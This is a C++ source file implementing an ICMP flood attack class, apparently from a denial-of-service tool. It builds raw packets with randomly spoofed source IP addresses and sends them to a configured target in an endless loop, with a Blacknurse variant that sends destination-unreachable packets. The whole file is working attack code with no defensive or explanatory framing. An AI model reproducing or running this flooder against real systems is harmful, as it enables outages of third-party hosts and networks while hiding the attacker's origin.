#include <unistd.h>
#include <cstring>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>

#include "../Headers/ICMP_Flood.hpp"
#include "../Headers/Randomizer.hpp"

void ICMP_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    char buf[400];
    std::string message{};
    // Structs
    auto *ip = (struct iphdr *)buf;
    auto *icmp = (struct icmphdr *)(ip + 1);
    struct hostent *hp;
    struct sockaddr_in dst{};
    while(true){
        for(int x = 0;x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if(!sockets[x]){
                sockets[x] = make_socket(IPPROTO_ICMP);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
                    logger->Log("Can't resolve the host", Logger::Error);
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
            }
            if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
                continue;
            }

            init_headers(ip, icmp, buf);
            override_options(icmp);

            dst.sin_addr.s_addr = ip->daddr;
            dst.sin_family = AF_UNSPEC;

            icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));

            if((r = static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
                close(sockets[x]);
                sockets[x] = make_socket(IPPROTO_ICMP);
            }else{
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        pause();
    }
}

ICMP_Flood::ICMP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {

}

void ICMP_Flood::override_options(icmphdr *icmp) {
    switch (conf->vector){
        case config::ICMPFlood:
            icmp->type = ICMP_ECHO;
            icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 1000));
            break;
        case config::Blacknurse:
            icmp->type = ICMP_DEST_UNREACH;
            icmp->code = static_cast<u_int8_t>(3);
            break;
        default:break;
    }
}
